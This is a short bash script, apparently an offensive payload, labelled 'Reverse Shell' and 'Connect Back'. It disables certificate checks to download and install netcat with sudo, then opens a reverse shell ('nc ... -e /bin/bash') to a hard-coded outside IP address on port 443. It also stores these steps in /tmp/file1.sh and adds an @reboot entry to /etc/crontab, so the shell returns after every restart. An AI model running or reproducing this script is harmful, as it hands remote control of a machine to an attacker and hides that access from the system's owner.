#!/bin/bash

# Reverse Shell
wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificate
tar -xzvf netcat-0.7.1.tar.gz
cd netcat-0.7.1 
./configure
sudo make
sudo make install
nc 3.84.116.126 443 -e /bin/bash

# Connect Back
cat << EOF > /tmp/file1.sh
#!/bin/bash
wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificate
tar -xzvf netcat-0.7.1.tar.gz
cd netcat-0.7.1 
./configure
sudo make
sudo make install
nc 3.84.116.126 443 -e /bin/bash
EOF

echo "@reboot /tmp/file1.sh"  >>  /etc/crontab
